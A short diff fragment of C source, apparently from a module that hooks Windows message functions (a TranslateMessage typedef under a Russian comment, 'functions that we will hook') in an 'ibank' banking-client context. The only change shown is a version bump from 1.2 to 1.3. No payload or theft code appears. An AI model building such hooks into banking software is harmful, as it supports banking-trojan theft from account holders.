@@ -34,7 +34,7 @@ typedef struct __ibankstruct
 PIBANK pIbank;
 
 
-char version[]="1.2";
+char version[]="1.3";
 
 //ф-ции которые будем хукать
 typedef BOOL   ( WINAPI *PIbankTranslateMessage )( const MSG *lpMsg );
